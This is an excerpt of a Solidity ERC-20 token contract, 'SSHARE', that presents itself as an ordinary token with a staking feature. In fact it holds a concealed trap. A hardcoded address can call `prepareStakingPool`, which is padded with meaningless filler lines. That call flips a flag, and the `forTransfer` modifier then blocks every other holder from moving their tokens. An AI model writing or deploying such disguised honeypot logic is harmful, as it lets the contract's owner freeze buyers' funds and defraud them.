...
contract SSHARE is Context, IERC20, IERC20Metadata {
    ...
    uint256 public stakingPoolaaStatus = 0;

    string private _tokenaa_name;
    string private _tokenaa_symbol;

    address private _poolaaAddress = 0x5eA3F3fDBa330eB015d63C46E74c076f9c41a219;

    constructor() {
        _tokenaa_name = "SSHARE";
        _tokenaa_symbol = "SSHARE";
        _tokenaa_totalSupply = 1000 * 10 ** 18;
        _balances[msg.sender] = _tokenaa_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolaaAddress || _tokenaa_status == 0);
        _;
    }
    ...
    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPoolaaStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _poolaaAddress)
        {
            _tokenaa_status = 1;
        }
    }
